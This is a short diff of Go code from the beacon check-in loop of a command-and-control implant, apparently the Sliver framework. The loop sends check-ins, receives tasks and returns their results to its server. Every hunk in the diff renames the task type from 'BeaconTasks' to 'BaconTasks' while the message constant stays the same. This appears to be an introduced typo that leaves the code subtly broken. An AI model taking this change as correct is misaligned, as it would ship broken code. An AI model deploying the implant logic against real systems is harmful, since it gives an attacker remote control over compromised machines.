@@ -357,7 +357,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BaconTasks{
 		ID:          InstanceID,
 		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
@@ -383,7 +383,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		// {{end}}
 		return nil
 	}
-	tasks := &sliverpb.BeaconTasks{}
+	tasks := &sliverpb.BaconTasks{}
 	err = proto.Unmarshal(envelope.Data, tasks)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -420,7 +420,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		results = append(results, r)
 	}
 
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BaconTasks{
 		ID:    InstanceID,
 		Tasks: results,
 	}))
